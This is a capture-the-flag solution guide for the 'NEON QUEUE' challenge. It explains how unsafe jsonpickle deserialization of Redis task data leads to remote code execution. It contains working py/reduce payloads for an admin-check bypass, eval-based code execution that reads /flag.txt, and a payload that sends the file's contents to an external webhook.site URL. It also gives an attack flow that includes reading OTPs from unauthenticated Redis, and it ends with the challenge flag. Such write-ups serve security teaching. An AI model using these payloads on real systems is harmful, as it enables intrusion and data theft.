# NEON QUEUE - Solution Guide

## Vulnerability: jsonpickle Deserialization

The worker uses `jsonpickle.decode()` to deserialize task data from Redis. This allows **Remote Code Execution** via the `py/reduce` feature.

## Exploit Methods

### Method 1: Logic Bypass (`exploit.py`)
Bypass `is_admin()` and `is_valid()` checks using callable attributes.

```bash
python exploit.py <target_ip>
```

**How it works:**
- Uses `types.SimpleNamespace` for objects
- Uses `functools.partial(bool, 1)` as callable methods
- When worker calls `meta.is_admin()`, it returns True

**Payload:**
```json
{
  "py/object": "types.SimpleNamespace",
  "py/state": {
    "type": "get_flag",
    "meta": {
      "py/object": "types.SimpleNamespace",
      "py/state": {
        "is_admin": {
          "py/reduce": [
            {"py/function": "functools.partial"},
            {"py/tuple": [{"py/function": "builtins.bool"}, 1]}
          ]
        }
      }
    }
  }
}
```

---

### Method 2: RCE + Redis Exfil (`exploit_rce_redis.py`)
Execute arbitrary code and write flag to Redis.

```bash
python exploit_rce_redis.py <target_ip>
```

**Payload:**
```json
{
  "py/reduce": [
    {"py/function": "builtins.eval"},
    {"py/tuple": ["__import__('redis').Redis(host='redis').set('pwned', open('/flag.txt').read())"]}
  ]
}
```

---

### Method 3: RCE + Webhook Exfil (`exploit_rce_webhook.py`) ⭐ Recommended
Execute arbitrary code and send flag to YOUR webhook (private).

```bash
python exploit_rce_webhook.py <target_ip> <your_webhook_url>
python exploit_rce_webhook.py 129.212.236.27 https://webhook.site/your-id
```

**Payload:**
```json
{
  "py/reduce": [
    {"py/function": "builtins.eval"},
    {"py/tuple": ["__import__('urllib.request').urlopen(Request('https://webhook.site/xxx', data=open('/flag.txt').read()))"]}
  ]
}
```

---

## Attack Flow

1. **Port scan** → Find Redis on port 6379 (no auth!)
2. **Examine Redis** → See `otp:{user_id}` keys and `task:{uuid}` payloads
3. **Bypass OTP** → Read OTP from Redis to verify account
4. **Examine payloads** → See `py/object` markers → recognize **jsonpickle**
5. **Research** → Google "jsonpickle vulnerability" or "jsonpickle RCE"
6. **Exploit** → Use `py/reduce` to execute code or bypass checks
7. **Get flag!**

## Why jsonpickle is Vulnerable

jsonpickle's `py/reduce` feature is designed to reconstruct complex objects by calling factory functions. But it can call **ANY** Python function:

```json
{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["whoami"]}]}
```

This executes `os.system("whoami")` during deserialization!

## Requirements

```bash
pip install redis requests
```

## Flag

```
BUETCTF{r3d15_541d_7ru57_m3_br0_T_T}
```
